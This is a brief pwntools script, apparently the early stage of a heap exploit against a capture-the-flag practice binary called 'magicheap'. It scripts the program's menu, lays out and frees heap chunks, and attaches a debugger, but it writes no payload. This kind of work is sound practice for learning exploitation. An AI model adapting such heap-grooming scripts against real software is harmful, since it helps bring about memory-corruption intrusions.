from pwn import *
context(log_level="debug")

p=process('./magicheap')

def create(size, content):
	p.sendlineafter('Your choice :', '1')
	p.sendlineafter('Size of Heap : ', str(size))
	p.sendafter('Content of heap:', content)
def edit(index, size, content):
	p.sendlineafter('Your choice :', '2')
	p.sendlineafter('Index :', str(index))
	p.sendlineafter('Size of Heap : ', str(size))
	p.sendafter('Content of heap:', content)
def free(index):
	p.sendlineafter('Your choice :', '3')
	p.sendlineafter('Index :', str(index))

create(0x90, "a")
create(0x10, 'b') # 1
create(0x90, 'c') # 2
create(0x10, 'd') # 3
create(0x90, 'e') # 4
create(0x10, 'f') # 5
create(0x90, 'g') # 6
create(0x10, 'h') # 7

gdb.attach(p, "b *0x00000000004008AD")
free(0)
gdb.attach(p, "b *0x00000000004008AD")
free(2)
free(4)
free(6)

p.interactive()


